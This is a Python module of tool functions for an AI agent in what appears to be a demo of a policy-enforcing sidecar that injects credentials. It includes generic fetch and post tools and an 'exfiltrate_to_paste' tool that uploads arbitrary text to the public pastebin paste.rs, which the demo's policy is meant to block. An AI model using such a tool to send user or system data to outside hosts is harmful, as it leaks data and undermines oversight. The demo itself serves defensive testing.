import os

import httpx
from agents import function_tool

_CA_BUNDLE = os.environ.get("SSL_CERT_FILE", True)
_DEFAULT_HEADERS = {
    "x-openauthority-session-id": os.environ.get("OPENAUTHORITY_SESSION_ID", "demo-session"),
}


def _client(**kwargs) -> httpx.AsyncClient:
    headers = {**_DEFAULT_HEADERS, **kwargs.pop("headers", {})}
    return httpx.AsyncClient(
        verify=_CA_BUNDLE, timeout=10.0, headers=headers, **kwargs
    )


@function_tool
async def get_weather(city: str) -> str:
    """Get current weather for a city using wttr.in."""
    async with _client() as client:
        response = await client.get(f"https://wttr.in/{city}?format=j1")
        response.raise_for_status()
        data = response.json()
        if "data" in data:
            data = data["data"]
        current = data["current_condition"][0]
        return (
            f"Weather in {city}: {current['weatherDesc'][0]['value']}, "
            f"Temperature: {current['temp_C']}°C, "
            f"Humidity: {current['humidity']}%, "
            f"Wind: {current['windspeedKmph']} km/h"
        )


@function_tool
async def get_ip_info() -> str:
    """Get IP address information from ipinfo.io.

    The agent calls ``https://ipinfo.io/json`` with no credentials. When the
    OpenAuthority sidecar is in front of the agent, it injects the ``IPINFO_TOKEN``
    as an ``Authorization: Bearer <token>`` header before the request leaves
    the host. The agent process never sees the token — this is the canonical
    OpenAuthority credential-injection demo.
    """
    async with _client() as client:
        response = await client.get("https://ipinfo.io/json")
        response.raise_for_status()
        return response.text


@function_tool
async def fetch_url(url: str) -> str:
    """Fetch content from a URL and return the response text."""
    async with _client() as client:
        response = await client.get(url)
        response.raise_for_status()
        return response.text


@function_tool
async def post_data(url: str, data: str) -> str:
    """Post data to a URL and return the response."""
    async with _client() as client:
        response = await client.post(url, content=data)
        response.raise_for_status()
        return response.text


@function_tool
async def exfiltrate_to_paste(data: str) -> str:
    """Publish arbitrary text to the public pastebin at paste.rs.

    Returns the URL of the created paste. This tool is intentionally
    dangerous: it models data exfiltration. OpenAuthority's example Cedar policy
    denies POSTs to ``paste.rs`` at the sidecar, which is what turns this
    into the demo's one-command DENY scenario.
    """
    async with _client() as client:
        response = await client.post("https://paste.rs", content=data)
        response.raise_for_status()
        return response.text.strip()
